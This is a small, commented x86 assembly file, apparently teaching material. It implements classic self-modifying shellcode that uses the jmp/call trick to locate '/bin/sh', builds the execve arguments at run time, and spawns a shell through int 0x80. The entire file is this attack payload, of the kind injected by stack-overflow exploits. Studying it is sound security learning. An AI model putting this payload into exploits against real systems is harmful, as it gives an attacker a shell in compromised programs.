# use .data for self-modifying code
.section .data
.globl _start
_start:
        jmp find_shell
shell_back:
        # pop the address of `shell` into %ebx
        pop %ebx

        # place a null at "N"
        xor %eax, %eax
        movb %al, 7(%ebx)

        # put the address of "XXXX" into %ecx
        leal 8(%ebx), %ecx

        # put the address of `shell` into "XXXX"
        movl %ebx, (%ecx)

        # put the address of "YYYY" into %edx
        leal 12(%ebx), %edx

        # zero out YYYY
        movl %eax, (%edx)

        # call execve
        movb $11, %al
        int $0x80

        # call exit(0)
        xor %eax, %eax
        movb $1, %al
        xor %ebx, %ebx
        int $0x80
find_shell:
        # push the address of `shell` onto the stack
        call shell_back
shell:
        .ascii "/bin/shNXXXXYYYY"
